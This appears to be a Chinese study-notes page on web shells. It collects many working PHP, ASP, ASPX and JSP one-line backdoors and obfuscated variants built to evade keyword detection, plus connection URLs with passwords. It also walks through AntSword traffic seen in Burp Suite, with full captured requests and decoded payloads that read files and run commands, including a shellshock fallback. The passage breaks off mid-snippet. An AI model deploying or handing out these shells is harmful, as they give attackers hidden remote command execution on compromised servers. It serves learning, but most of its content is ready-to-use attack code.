---
title: 学习Web Shell
index: true
order: 1
isOriginal : true
date: 2024-03-14
category:
  - 计网基础
tag:
  - 计网基础
  - webshell
---

1. 通过GET、POST、COOKIE这三种方式向一个网站提交数据
2. 一句话木马用\$ \_GET[' ']、\$ \_POST[' ']、\$ \_COOKIE[' '] 、 \$ \_REQUEST[' ']接收传递的数据，并把接收的数据传递给一句话木马中代码执行的函数，进而执行命令。
3. 一句话木马大多都是只有两个部分：<span data-type="text" style="background-color: var(--b3-font-background1);">执行代码的函数部分</span>和<span data-type="text" style="background-color: var(--b3-font-background11);">接收数据的部分</span>

## PHP执行函数

PHP中可以执行代码的函数，常常被用来编写一句话木马

•代码执行函数8list：eval()、assert()、preg\_replace()、create\_function()、array\_map()、call\_user\_func()、call\_user\_func\_array()，array\_filter()

•命令执行函数5list：system()、exec()、shell\_exec()、popen()、passthru()、

## Burp Suite

* Burp Suite是一款集成化的渗透测试工具，包含了很多功能，可以帮助我们高效地完成对Web应用程序的渗透测试和攻击。

## PHP语法风格

```php

xml
<?php phpinfo() ?>

简短
<?=phpinfo() ?>

js
<script language="php">phpinfo()</script>
<script language='php'>@eval($_REQUEST['cmd'])</script>

简洁
<?phpinfo() ?> php.ini short._tag=on默认off php低版本

asp
<%phpinfo() %> php.ini asp_tags=on默认off
```

## eval()

eval()结构把字符串按照PHP代码来执行，该字符串必须是合法的PHP代码，且必须以分号结尾。

```php
<?php eval($_REQUEST['cmd'])?>
```

## assert()

类似eval，字符串被assert()当作PHP代码执行。

```php
<?php
assert($_REQUEST[cmd]);
?>
```

## create_function()

create function主要用来创建匿名函数,如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create functio()执行任意命令。

```php
<?php
$func =create_function(",$_REQUEST['cmd']);
$func();
?>
```

## preg_replace()

执行一个正则表达式的搜索和替换，但因为存在危险的/e修饰符，使preg_replace0将replacement参数当作PHP代码
5.5版本/e修饰符被弃用7.0版本不再支持/e修饰符

```php
<?php
@preg_replace("/abc/e",$_REQUEST['cmd'],"abc");
?>
```

## array_map()

将`用户自定义函数`作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组回调函数接受的参数数目应该和传递给array_map()函数的数组数目一致

```php
<?php
//?func=system&cmd=ipconfig
$func=$_REQUEST['func'];
$cmd=$_REQUEST['cmd'];
$array[0]=$cmd;
$new_array=array_map($func,$array);
?>
```

## array_filter()

`array_filter (array $array [,callable $callback [,int $flag =0 ]]):array`依次将array数组中的每个值传递到callback函数。如果callback函数返回true,则array数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。

```php
<?php
//?func=system&cmd=whoami
$cmd=$_REQUEST['cmd'];
$array1=array($cmd);
$func =$_REQUEST['func'];
array_filter($array1,$func);
?>
```

## call_user_func()

```php
<?php
	call_user_func($_GET['name'],$_GET['action']);
?>
```

`http://1.14.28.x:56690/upload/cuf.php?name=assert&action=phpinfo();`

## call_user_func_array()

```php
<?php
	call_user_func_array($_GET['name'],$_GET['action']);
?>
```

`http://1.14.28.x:56690/upload/cufa.php?name=assert&action[]=phpinfo()`

## usort()

```php
<?php usort($_GET,'asse'.'rt');?>
```

连接：`http://1.14.28.x:52666/upload/file40.php?1=2&2=eval($_POST[x])`  密码：x

注意：浏览器使用可能会报错，直接在antsword中连接。

## uasort()

```php
<?php
    $e = $_REQUEST['e'];
    $arr = array('test', $_REQUEST['x']);
    uasort($arr, base64_decode($e));
?>      //YXNzZXJ0   base64解码为assert
# payload e=YXNzZXJ0&x=phpinfo();
<?php
   $arr = new ArrayObject(array('test', $_REQUEST['x']));
   $arr->uasort('assert');
?>
```

`http://1.14.28.17:14503/upload/file59.php?e=YXNzZXJ0&x=phpinfo();`

`http://1.14.28.17:14503/upload/file60.php?x=phpinfo();`

` http://1.14.28.17:14503/upload/file60.php`  密码：x

## asp 一句话木马

```php
<%eval request(cmd);%>
<%execute request("cmd");%>
<%executeGlobal request(cmd);%>
<%execute request(chr(35));%> # ascii值
```

## asp 命令执行

```php
<%response.write server.createobject("wscript.shell").exec("cmd.exe /c "&request("cmd")).stdout.readall%>
```

## aspx 代码执行

```php
<%@ Page Language="Jscript"%><%                                    %>
//webshell 密码 pass
<%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["pass"], "unsafe"));%>
```

## jsp 命令执行

```php
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>

//参数 cmd=whoami

< %
if ("023".equals(request.getParameter("pwd"))) {
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while ((a = in.read(b)) != -1) {
        out.println(new String(b, 0, a));
    }
    out.print("</pre>");
} % >

//?pwd=023&i=whoami
```

## 变种str_replace()

```php
<7php
$b="assexx"
$c=str_replace("xx","rt",$b)
["=>$c($_GET[_])];
>
```

## 变种base64_decode()

将base64_decode0中的内容为`assert`的base64编码。这里$a相当于assert。

```php
<?php
$a=base64_decode("YXNzZXJO");
$a($_REQUEST['cmd']);
?>
```

## 连接符号

```php
<?php
$a='as';
$b = 'sert';
$c=$a.$b;
[''=>$c($_GET['-'])];
?>
```

## 动态调用

```php
<?php$_GET[0]($_GET[1])?>

<?php
$_REQUEST[a]($_REQUEST[cmd]); //利用方法：a=asserte&cmd=phpinfo();
?>

<?php
@assert($_REQUEST[$_REQUEST[b]); //利用方法：b=cmd&cmd=phpinfo():
?>
```

## 替代<？？>标签

```javascript
<script language="php">
@assert($_REQUEST['cmd'])
</script>
```

## 隐藏关键字

将需要隐藏的字符随机打乱，首先定义一些随机字符串，再调用打乱后的字符顺序并拼接成有效参数
下例中，$a=assert

```php
<?php
$str = 'abcsqebrt';
$a  = $str[0].$str[3].$str[3].$str[5].$str[7].$str[8];
@$a($REQUEST['cmd']);
?>
```

## 自定义函数

自定义函数名实现webshelll功能。下例中，admin=phpinfo0;

```php
<?php
function admin($a){
@eval($a);
}
adminadmin($REQUEST['admin'])
?>
```

## 自定义类

```php
<?php
class Webshell{
    function admin($a){
        @assert($a);
    }
}
$web =  new WebsheLl();I
$web->admin($_GET[0]);
>

<?php
class abc{
	public $a = null;
	public $b = null;
	function _construct(){
		$this->a ='@nffreg($_TRG[0]);';
		$this->b = str_rot13($this->a);
        @assert($this->b);
	}
}
new abc();
?>
```

## 对象魔术方法

str_rot13()函数对字符串执行RoT13编码。R0T13编码是把每一个字母在字母表中向前移动13个字母得到。数字和非字母字符保持不变。

```php
<?php
class Student{
public $xw = null;
public $xl = null;
function_construct()
{
$this->xw ='riny($_ERDHRFG['nqzva'])';
$this->xl =  str_rot13($this->xw);
@assert(Sthis->xl);
}
}
new Student();
?>
```

## create_function() 创建匿名函数

`create_function('参数'，'函数体代码')：创建匿名函数`

```php
<?php
	$func1 = create_function('$a,$b','return($a+$b);');
	echo $func1(10,20);
?>
```

## ((20240818201431-e2f5rkx 'Burp Suite'))代理Firefox

1. 打开Windows11 Penetration Suite Toolkit中的 ((20240818201431-e2f5rkx 'Burp Suite'))

2. 在firefox安装插件 FoxyProxy Standard
3. 在FoxyProxy Standard插件中配置 ：选项-proxies-添加-设置ip为127.0.0.1-port：8080、
4. [http://burp/](http://burp/)访问下载证书并安装到浏览器
5. 使用 ((20240818201431-e2f5rkx 'Burp Suite'))

## ((20240818201431-e2f5rkx 'Burp Suite'))代理AntSword

1. 配置AntSword代理

    打开AntSword-代理设置(`Ctrl+Shift+A`)-手动代理设置-127.0.0.1-8080

2. 配置Burp Suite Proxy

    打开Burp Suite-Burp-设置-Tools-Proxy-代理监听器-添加/编辑
3. 编写代码

    ```php
    <?php @eval($_REQUEST['cmd']);?>
    ```

4. 网站上传文件
5. 测试

    ```php
    http://1.14.28.x:38764/upload/file2.php?cmd=phpinfo();
    ```

6. 打开AntSword连接

    数据管理-空白处左键-添加数据-输入URL`http://1.14.28.x:38764/upload/file2.php`-密码cmd-测试连接-测试成功后添加
7. Burp Suite拦截

    打开Burp Suite-代理-拦截-开启拦截
8. 在AntSword中上传文件、执行命令、查看文件
9. 在Burp Suite中分析数据包

    ```php
    //打开文件
    POST /upload/file2.php HTTP/1.1
    Host: 1.14.28.x:38764
    Accept-Encoding: gzip, deflate
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 1447
    Connection: close

    cmd=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3B%24opdir%3D%40ini_get(%22open_basedir%22)%3Bif(%24opdir)%20%7B%24ocwd%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24oparr%3Dpreg_split(base64_decode(%22Lzt8Oi8%3D%22)%2C%24opdir)%3B%40array_push(%24oparr%2C%24ocwd%2Csys_get_temp_dir())%3Bforeach(%24oparr%20as%20%24item)%20%7Bif(!%40is_writable(%24item))%7Bcontinue%3B%7D%3B%24tmdir%3D%24item.%22%2F.5e9da%22%3B%40mkdir(%24tmdir)%3Bif(!%40file_exists(%24tmdir))%7Bcontinue%3B%7D%24tmdir%3Drealpath(%24tmdir)%3B%40chdir(%24tmdir)%3B%40ini_set(%22open_basedir%22%2C%20%22..%22)%3B%24cntarr%3D%40preg_split(%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22%2C%24tmdir)%3Bfor(%24i%3D0%3B%24i%3Csizeof(%24cntarr)%3B%24i%2B%2B)%7B%40chdir(%22..%22)%3B%7D%3B%40ini_set(%22open_basedir%22%2C%22%2F%22)%3B%40rmdir(%24tmdir)%3Bbreak%3B%7D%3B%7D%3B%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%223744%22.%22d678%22%3Becho%20%40asenc(%24output)%3Becho%20%2208d%22.%228ec%22%3B%7Dob_start()%3Btry%7B%24F%3Dbase64_decode(substr(%24_POST%5B%22s0de0dca121e8b%22%5D%2C2))%3B%24P%3D%40fopen(%24F%2C%22r%22)%3Becho(%40fread(%24P%2Cfilesize(%24F)%3Ffilesize(%24F)%3A4096))%3B%40fclose(%24P)%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B&s0de0dca121e8b=x0L3Zhci93d3cvaHRtbC91cGxvYWQvZmlsZTIucGhw


    HTTP/1.1 200 OK
    Date: Sun, 18 Aug 2024 05:59:37 GMT
    Server: Apache/2.4.10 (Debian)
    X-Powered-By: PHP/5.5.38
    Content-Length: 46
    Connection: close
    Content-Type: text/html

    3744d678<?php @eval($_REQUEST['cmd']);?>08d8ec
    ```

    ```php
    //下载文件
    POST /upload/file2.php HTTP/1.1
    Host: 1.14.28.x:38764
    Accept-Encoding: gzip, deflate
    User-Agent: Opera/9.80 (X11; Linux i686; U; ja) Presto/2.7.62 Version/11.01
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 1564
    Connection: close

    cmd=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3B%24opdir%3D%40ini_get(%22open_basedir%22)%3Bif(%24opdir)%20%7B%24ocwd%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24oparr%3Dpreg_split(base64_decode(%22Lzt8Oi8%3D%22)%2C%24opdir)%3B%40array_push(%24oparr%2C%24ocwd%2Csys_get_temp_dir())%3Bforeach(%24oparr%20as%20%24item)%20%7Bif(!%40is_writable(%24item))%7Bcontinue%3B%7D%3B%24tmdir%3D%24item.%22%2F.bce994%22%3B%40mkdir(%24tmdir)%3Bif(!%40file_exists(%24tmdir))%7Bcontinue%3B%7D%24tmdir%3Drealpath(%24tmdir)%3B%40chdir(%24tmdir)%3B%40ini_set(%22open_basedir%22%2C%20%22..%22)%3B%24cntarr%3D%40preg_split(%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22%2C%24tmdir)%3Bfor(%24i%3D0%3B%24i%3Csizeof(%24cntarr)%3B%24i%2B%2B)%7B%40chdir(%22..%22)%3B%7D%3B%40ini_set(%22open_basedir%22%2C%22%2F%22)%3B%40rmdir(%24tmdir)%3Bbreak%3B%7D%3B%7D%3B%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%225ff%22.%22c758%22%3Becho%20%40asenc(%24output)%3Becho%20%22e1a%22.%2258d%22%3B%7Dob_start()%3Btry%7B%24F%3Dbase64_decode(substr(get_magic_quotes_gpc()%3Fstripslashes(%24_POST%5B%22s0de0dca121e8b%22%5D)%3A%24_POST%5B%22s0de0dca121e8b%22%5D%2C2))%3B%24fp%3D%40fopen(%24F%2C%22r%22)%3Bif(%40fgetc(%24fp))%7B%40fclose(%24fp)%3B%40readfile(%24F)%3B%7Delse%7Becho(%22ERROR%3A%2F%2F%20Can%20Not%20Read%22)%3B%7D%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B&s0de0dca121e8b=19L3Zhci93d3cvaHRtbC91cGxvYWQvZmlsZTIucGhw


    HTTP/1.1 200 OK
    Date: Sun, 18 Aug 2024 05:55:14 GMT
    Server: Apache/2.4.10 (Debian)
    X-Powered-By: PHP/5.5.38
    Content-Length: 45
    Connection: close
    Content-Type: text/html

    5ffc758<?php @eval($_REQUEST['cmd']);?>e1a58d
    ```

    ```php
    //执行命令
    POST /upload/file2.php HTTP/1.1
    Host: 1.14.28.17:38764
    Accept-Encoding: gzip, deflate
    User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 4892
    Connection: close

    c330107da08dea=GYY2QgIi92YXIvd3d3L2h0bWwvdXBsb2FkIjtwd2Q7ZWNobyAzNGIxYzcwOTE7cHdkO2VjaG8gYTEyYTU5Ng%3D%3D&cmd=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3B%24opdir%3D%40ini_get(%22open_basedir%22)%3Bif(%24opdir)%20%7B%24ocwd%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24oparr%3Dpreg_split(base64_decode(%22Lzt8Oi8%3D%22)%2C%24opdir)%3B%40array_push(%24oparr%2C%24ocwd%2Csys_get_temp_dir())%3Bforeach(%24oparr%20as%20%24item)%20%7Bif(!%40is_writable(%24item))%7Bcontinue%3B%7D%3B%24tmdir%3D%24item.%22%2F.1ca4f0%22%3B%40mkdir(%24tmdir)%3Bif(!%40file_exists(%24tmdir))%7Bcontinue%3B%7D%24tmdir%3Drealpath(%24tmdir)%3B%40chdir(%24tmdir)%3B%40ini_set(%22open_basedir%22%2C%20%22..%22)%3B%24cntarr%3D%40preg_split(%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22%2C%24tmdir)%3Bfor(%24i%3D0%3B%24i%3Csizeof(%24cntarr)%3B%24i%2B%2B)%7B%40chdir(%22..%22)%3B%7D%3B%40ini_set(%22open_basedir%22%2C%22%2F%22)%3B%40rmdir(%24tmdir)%3Bbreak%3B%7D%3B%7D%3B%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%22dc8d7%22.%2232d8c0%22%3Becho%20%40asenc(%24output)%3Becho%20%22d57cd%22.%221b298%22%3B%7Dob_start()%3Btry%7B%24p%3Dbase64_decode(substr(%24_POST%5B%22q8d9e95cdfd879%22%5D%2C2))%3B%24s%3Dbase64_decode(substr(%24_POST%5B%22c330107da08dea%22%5D%2C2))%3B%24envstr%3D%40base64_decode(substr(%24_POST%5B%22qeeee61ac10ddb%22%5D%2C2))%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24c%3Dsubstr(%24d%2C0%2C1)%3D%3D%22%2F%22%3F%22-c%20%5C%22%7B%24s%7D%5C%22%22%3A%22%2Fc%20%5C%22%7B%24s%7D%5C%22%22%3Bif(substr(%24d%2C0%2C1)%3D%3D%22%2F%22)%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%22)%3B%7Delse%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3BC%3A%2FWindows%2Fsystem32%3BC%3A%2FWindows%2FSysWOW64%3BC%3A%2FWindows%3BC%3A%2FWindows%2FSystem32%2FWindowsPowerShell%2Fv1.0%2F%3B%22)%3B%7Dif(!empty(%24envstr))%7B%24envarr%3Dexplode(%22%7C%7C%7Casline%7C%7C%7C%22%2C%20%24envstr)%3Bforeach(%24envarr%20as%20%24v)%20%7Bif%20(!empty(%24v))%20%7B%40putenv(str_replace(%22%7C%7C%7Caskey%7C%7C%7C%22%2C%20%22%3D%22%2C%20%24v))%3B%7D%7D%7D%24r%3D%22%7B%24p%7D%20%7B%24c%7D%22%3Bfunction%20fe(%24f)%7B%24d%3Dexplode(%22%2C%22%2C%40ini_get(%22disable_functions%22))%3Bif(empty(%24d))%7B%24d%3Darray()%3B%7Delse%7B%24d%3Darray_map('trim'%2Carray_map('strtolower'%2C%24d))%3B%7Dreturn(function_exists(%24f)%26%26is_callable(%24f)%26%26!in_array(%24f%2C%24d))%3B%7D%3Bfunction%20runshellshock(%24d%2C%20%24c)%20%7Bif%20(substr(%24d%2C%200%2C%201)%20%3D%3D%20%22%2F%22%20%26%26%20fe('putenv')%20%26%26%20(fe('error_log')%20%7C%7C%20fe('mail')))%20%7Bif%20(strstr(readlink(%22%2Fbin%2Fsh%22)%2C%20%22bash%22)%20!%3D%20FALSE)%20%7B%24tmp%20%3D%20tempnam(sys_get_temp_dir()%2C%20'as')%3Bputenv(%22PHP_LOL%3D()%20%7B%20x%3B%20%7D%3B%20%24c%20%3E%24tmp%202%3E%261%22)%3Bif%20(fe('error_log'))%20%7Berror_log(%22a%22%2C%201)%3B%7D%20else%20%7Bmail(%22a%40127.0.0.1%22%2C%20%22%22%2C%20%22%22%2C%20%22-bv%22)%3B%7D%7D%20else%20%7Breturn%20False%3B%7D%24output%20%3D%20%40file_get_contents(%24tmp)%3B%40unlink(%24tmp)%3Bif%20(%24output%20!%3D%20%22%22)%20%7Bprint(%24output)%3Breturn%20True%3B%7D%7Dreturn%20False%3B%7D%3Bfunction%20runcmd(%24c)%7B%24ret%3D0%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(fe('system'))%7B%40system(%24c%2C%24ret)%3B%7Delseif(fe('passthru'))%7B%40passthru(%24c%2C%24ret)%3B%7Delseif(fe('shell_exec'))%7Bprint(%40shell_exec(%24c))%3B%7Delseif(fe('exec'))%7B%40exec(%24c%2C%24o%2C%24ret)%3Bprint(join(%22%0A%22%2C%24o))%3B%7Delseif(fe('popen'))%7B%24fp%3D%40popen(%24c%2C'r')%3Bwhile(!%40feof(%24fp))%7Bprint(%40fgets(%24fp%2C2048))%3B%7D%40pclose(%24fp)%3B%7Delseif(fe('proc_open'))%7B%24p%20%3D%20%40proc_open(%24c%2C%20array(1%20%3D%3E%20array('pipe'%2C%20'w')%2C%202%20%3D%3E%20array('pipe'%2C%20'w'))%2C%20%24io)%3Bwhile(!%40feof(%24io%5B1%5D))%7Bprint(%40fgets(%24io%5B1%5D%2C2048))%3B%7Dwhile(!%40feof(%24io%5B2%5D))%7Bprint(%40fgets(%24io%5B2%5D%2C2048))%3B%7D%40fclose(%24io%5B1%5D)%3B%40fclose(%24io%5B2%5D)%3B%40proc_close(%24p)%3B%7Delseif(fe('antsystem'))%7B%40antsystem(%24c)%3B%7Delseif(runshellshock(%24d%2C%20%24c))%20%7Breturn%20%24ret%3B%7Delseif(substr(%24d%2C0%2C1)!%3D%22%2F%22%20%26%26%20%40class_exists(%22COM%22))%7B%24w%3Dnew%20COM('WScript.shell')%3B%24e%3D%24w-%3Eexec(%24c)%3B%24so%3D%24e-%3EStdOut()%3B%24ret.%3D%24so-%3EReadAll()%3B%24se%3D%24e-%3EStdErr()%3B%24ret.%3D%24se-%3EReadAll()%3Bprint(%24ret)%3B%7Delse%7B%24ret%20%3D%20127%3B%7Dreturn%20%24ret%3B%7D%3B%24ret%3D%40runcmd(%24r.%22%202%3E%261%22)%3Bprint%20(%24ret!%3D0)%3F%22ret%3D%7B%24ret%7D%22%3A%22%22%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B&q8d9e95cdfd879=7OL2Jpbi9zaA%3D%3D&qeeee61ac10ddb=Rb


    HTTP/1.1 200 OK
    Date: Sun, 18 Aug 2024 06:03:26 GMT
    Server: Apache/2.4.10 (Debian)
    X-Powered-By: PHP/5.5.38
    Vary: Accept-Encoding
    Content-Length: 81
    Connection: close
    Content-Type: text/html

    dc8d732d8c0/var/www/html/upload
    34b1c7091
    /var/www/html/upload
    a12a596
    d57cd1b298
    ```

10. 数据包解码

     ```php
     //下载文件解码
     <?php
     @ini_set("display_errors", "0");
     @set_time_limit(0);
     $opdir = @ini_get("open_basedir");
     if ($opdir) {
         $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
         $oparr = preg_split(base64_decode("Lzt8Oi8="), $opdir);
         @array_push($oparr, $ocwd, sys_get_temp_dir());
         foreach ($oparr as $item) {
             if (!@is_writable($item)) {
                 continue;
             }
             $tmdir = $item . "/.bce994";
             @mkdir($tmdir);
             if (!@file_exists($tmdir)) {
                 continue;
             }
             $tmdir = realpath($tmdir);
             @chdir($tmdir);
             @ini_set("open_basedir", "..");
             $cntarr = @preg_split("/\\\\|\//", $tmdir);
             for ($i = 0; $i < sizeof($cntarr); $i++) {
                 @chdir("..");
             }
             @ini_set("open_basedir", "/");
             @rmdir($tmdir);
             break;
         }
     }
     function asenc($out)
     {
         return $out;
     }
     function asoutput()
     {
         $output = ob_get_contents();
         ob_end_clean();
         echo "5ff" . "c758";
         echo @asenc($output);
         echo "e1a" . "58d";
     }
     ob_start();
     try {
         $F = base64_decode(
             substr(
                 get_magic_quotes_gpc()
                     ? stripslashes($_POST["s0de0dca121e8b"])
                     : $_POST["s0de0dca121e8b"],
                 2
             )
         );
         $fp = @fopen($F, "r");
         if (@fgetc($fp)) {
             @fclose($fp);
             @readfile($F);
         } else {
             echo "ERROR:// Can Not Read";
         }
     } catch (Exception $e) {
         echo "ERROR://" . $e->getMessage();
     }
     asoutput();

     ?>

     //打开文件解码
     <?php
     @ini_set("display_errors", "0");
     @set_time_limit(0);
     $opdir = @ini_get("open_basedir");
     if ($opdir) {
         $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
         $oparr = preg_split(base64_decode("Lzt8Oi8="), $opdir);
         @array_push($oparr, $ocwd, sys_get_temp_dir());
         foreach ($oparr as $item) {
             if (!@is_writable($item)) {
                 continue;
             }
             $tmdir = $item . "/.5e9da";
             @mkdir($tmdir);
             if (!@file_exists($tmdir)) {
                 continue;
             }
             $tmdir = realpath($tmdir);
             @chdir($tmdir);
             @ini_set("open_basedir", "..");
             $cntarr = @preg_split("/\\\\|\//", $tmdir);
             for ($i = 0; $i < sizeof($cntarr); $i++) {
                 @chdir("..");
             }
             @ini_set("open_basedir", "/");
             @rmdir($tmdir);
             break;
         }
     }
     function asenc($out)
     {
         return $out;
     }
     function asoutput()
     {
         $output = ob_get_contents();
         ob_end_clean();
         echo "3744" . "d678";
         echo @asenc($output);
         echo "08d" . "8ec";
     }
     ob_start();
     try {
         $F = base64_decode(substr($_POST["s0de0dca121e8b"], 2));
         $P = @fopen($F, "r");
         echo @fread($P, filesize($F) ? filesize($F) : 4096);
         @fclose($P);
     } catch (Exception $e) {
         echo "ERROR://" . $e->getMessage();
     }
     asoutput();
     die();
     ?>


     //执行命令解码
     <?php
     @ini_set("display_errors", "0");       //关闭全局报错
     @set_time_limit(0);                    //设置运行时间无限制
     $opdir = @ini_get("open_basedir");     //获取配置选项
     if ($opdir) {                          //open_basedir 限制php可访问的路径
         $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);           //$_SERVER["SCRIPT_FILENAME"] 存储文件的绝对路径
         $oparr = preg_split(base64_decode("Lzt8Oi8="), $opdir); //Lzt8Oi8是/;|:/
         @array_push($oparr, $ocwd, sys_get_temp_dir());         //目录放入数组
         foreach ($oparr as $item) {                             //数组分离
             if (!@is_writable($item)) {                         //判断目录是否可写
                 continue;
             }
             $tmdir = $item . "/.1ca4f0";
             @mkdir($tmdir);                                     //新建目录
             if (!@file_exists($tmdir)) {                        //判断目录是否可写
                 continue;
             }
             $tmdir = realpath($tmdir);                          //返回目录绝对路径
             @chdir($tmdir);
             @ini_set("open_basedir", "..");
             $cntarr = @preg_split("/\\\\|\//", $tmdir);         //匹配路径分离\\ //
             for ($i = 0; $i < sizeof($cntarr); $i++) {          //遍历目录
                 @chdir("..");                                   //测试是否可以查看上层目录
             }
             @ini_set("open_basedir", "/");
             @rmdir($tmdir);                                     //删除测试目录                  
             break;
         }
     }
     function asenc($out)
     {
         return $out;
     }
     function asoutput()
     {
         $output = ob_get_contents();
         ob_end_clean();
         echo "dc8d7" . "32d8c0";
         echo @asenc($output);
         echo "d57cd" . "1b298";
     }
     ob_start();
     try {
         $p = base64_decode(substr($_POST["q8d9e95cdfd879"], 2));
         $s = base64_decode(substr($_POST["c330107da08dea"], 2));
         $envstr = @base64_decode(substr($_POST["qeeee61ac10ddb"], 2));
         $d = dirname($_SERVER["SCRIPT_FILENAME"]);
         $c = substr($d, 0, 1) == "/" ? "-c \"{$s}\"" : "/c \"{$s}\"";
         if (substr($d, 0, 1) == "/") {
             @putenv(
                 "PATH=" .
                     getenv("PATH") .
                     ":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
             );
         } else {
             @putenv(
                 "PATH=" .
                     getenv("PATH") .
                     ";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;"
             );
         }
         if (!empty($envstr)) {
             $envarr = explode("|||asline|||", $envstr);
             foreach ($envarr as $v) {
                 if (!empty($v)) {
                     @putenv(str_replace("|||askey|||", "=", $v));
                 }
             }
         }
         $r = "{$p} {$c}";
         function fe($f)
         {
             $d = explode(",", @ini_get("disable_functions"));
             if (empty($d)) {
                 $d = [];
             } else {
                 $d = array_map("trim", array_map("strtolower", $d));
             }
             return function_exists($f) && is_callable($f) && !in_array($f, $d);
         }
         function runshellshock($d, $c)
         {
             if (
                 substr($d, 0, 1) == "/" &&
                 fe("putenv") &&
                 (fe("error_log") || fe("mail"))
             ) {
                 if (strstr(readlink("/bin/sh"), "bash") != false) {
                     $tmp = tempnam(sys_get_temp_dir(), "as");
                     putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
                     if (fe("error_log")) {
                         error_log("a", 1);
                     } else {
                         mail("a@127.0.0.1", "", "", "-bv");
                     }
                 } else {
                     return false;
                 }
                 $output = @file_get_contents($tmp);
                 @unlink($tmp);
                 if ($output != "") {
                     print $output;
                     return true;
                 }
             }
             return false;
         }
         function runcmd($c)
         {
             $ret = 0;
             $d = dirname($_SERVER["SCRIPT_FILENAME"]);
             if (fe("system")) {
                 @system($c, $ret);
             } elseif (fe("passthru")) {
                 @passthru($c, $ret);
             } elseif (fe("shell_exec")) {
                 print @shell_exec($c);
             } elseif (fe("exec")) {
                 @exec($c, $o, $ret);
                 print join(
                     "
     ",
                     $o
                 );
             } elseif (fe("popen")) {
                 $fp = @popen($c, "r");
                 while (!@feof($fp)) {
                     print @fgets($fp, 2048);
                 }
                 @pclose($fp);
             } elseif (fe("proc_open")) {
                 $p = @proc_open($c, [1 => ["pipe", "w"], 2 => ["pipe", "w"]], $io);
                 while (!@feof($io[1])) {
                     print @fgets($io[1], 2048);
                 }
                 while (!@feof($io[2])) {
                     print @fgets($io[2], 2048);
                 }
                 @fclose($io[1]);
                 @fclose($io[2]);
                 @proc_close($p);
             } elseif (fe("antsystem")) {
                 @antsystem($c);
             } elseif (runshellshock($d, $c)) {
                 return $ret;
             } elseif (substr($d, 0, 1) != "/" && @class_exists("COM")) {
                 $w = new COM("WScript.shell");
                 $e = $w->exec($c);
                 $so = $e->StdOut();
                 $ret .= $so->ReadAll();
                 $se = $e->StdErr();
                 $ret .= $se->ReadAll();
                 print $ret;
             } else {
                 $ret = 127;
             }
             return $ret;
         }
         $ret = @runcmd($r . " 2>&1");
         print $ret != 0 ? "ret={$ret}" : "";
     } catch (Exception $e) {
         echo "ERROR://" . $e->getMessage();
     }
     asoutput();
     die();
     ?>
     ```

## PHP加密上传

1. PHP源码

    ```php
    //代码1
    <?php
    function admin($a){
    	@assert($a);
    }
    admin($_GET[0]);
    ?>

    //代码2
    <?php
    $a=(chr(65)^chr(32)).(chr(83)^chr(32)).(chr(83)^chr(32)).(chr(5)^chr(96)).(chr(82)^chr(32)).(chr(84)^chr(32));
    //assert
    $b='_'.(chr('103')^chr(32)).(chr(101)^chr(32)).(chr(116)^chr(32));//_GET
    $c=$$b;//$_GET
